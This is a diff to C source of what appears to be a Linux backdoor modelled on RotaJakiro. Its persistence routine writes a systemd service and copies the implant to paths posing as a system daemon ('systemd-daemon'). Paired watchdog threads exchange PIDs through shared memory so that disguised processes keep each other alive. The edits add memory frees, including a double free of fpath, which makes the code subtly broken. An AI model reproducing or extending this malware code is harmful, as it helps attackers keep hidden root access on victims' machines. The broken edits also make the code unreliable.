@@ -287,6 +287,7 @@ bool root_persistence(void) {
         memset(fpath,0, fpath_size);
         result = write_to_file(fpath, systemd_agent_conf);
         copy_rota_to_userland("/bin/systemd/systemd-daemon");
+        free(fpath);
 
     } else { // non systemd system...
         /**
@@ -311,6 +312,7 @@ bool root_persistence(void) {
 
         result = write_to_file(fpath, sys_temd_agent_service);
         copy_rota_to_userland("/usr/lib/systemd/systemd-daemon");
+        free(fpath);
     }
 
     free(fpath);
@@ -335,6 +337,7 @@ bool monitor_proc(int *pid) {
 
     int res = access(finalpath, F_OK);
     free(finalpath);
+    free(c_pid);
     if (res == 0 ) {
         return true; // file exists
     } else {
@@ -384,7 +387,6 @@ void *watchdog_process_shmget() {
     // write PID to sharedmem
     int *addr = (int *)shmat(shmid, NULL, 0);
     memcpy(addr, &pid, 4);
-    //sleep(10);
 
     do {
 
@@ -444,8 +446,8 @@ void *watchdog_process_shmread() {
             #ifdef DEBUG
             fprintf(stderr, "\n[watchdog_process_shmread](%d) %s\n", getpid(), strerror(errno));
             #endif
+            watchdog_process_shmread();
         }
-
 
         sleep(3);
         // get PID to write sharedmem
@@ -460,7 +462,7 @@ void *watchdog_process_shmread() {
             exit(1);
         }
 
-        memcpy(addr+4, &pid, 4); // copy to "upper half" of 8 bytes.:
+        memcpy(addr+4, &pid, 4); // copy to "upper half" of 8 bytes:
 
         #ifdef DEBUG
         fprintf(stdout, "\n[wathcdog_process_shmread] wrote %d to shared memory\n", getpid());
@@ -506,11 +508,13 @@ void spawn_thread_watchdog(int uid) {
     if (uid == 0){
         // the "parent thread" monitors session-dbus
         //pthread_create(&threadid, NULL, watchdog_process_shmget, fpath);
+        //pthread_create(&threadid, NULL, watchdog_process_shmread, NULL);
         pthread_create(&threadid, NULL, watchdog_process_shmget, NULL);
 
     } else {
         // the "child thread" monitors gvfsd-helper
         // pthread_create(&threadid, NULL, watchdog_process_shmread, fpath);
         pthread_create(&threadid, NULL, watchdog_process_shmread, NULL);
+        //pthread_create(&threadid, NULL, watchdog_process_shmget, NULL);
     }
 }
